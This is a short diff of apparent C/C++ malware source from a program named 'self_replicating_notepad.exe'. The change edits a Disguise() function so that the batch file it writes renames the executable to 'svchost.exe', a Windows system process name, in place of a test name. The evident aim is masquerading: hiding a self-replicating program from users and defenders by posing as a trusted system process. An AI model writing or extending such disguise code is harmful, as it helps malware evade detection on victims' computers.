@@ -102,7 +102,7 @@ std::string GetProcessName()
 void Disguise()
 {
 	char batname[MAX] = "disguise.bat";
-	char batcmd[MAX] = "@echo off\nrename self_replicating_notepad.exe testrename.exe\ntestrename.exe\nexit 0";
+	char batcmd[MAX] = "@echo off\nrename self_replicating_notepad.exe svchost.exe\nexit 0";
 	FILE* fp;
 	fp = fopen(batname, "w");
 	fprintf(fp, batcmd);
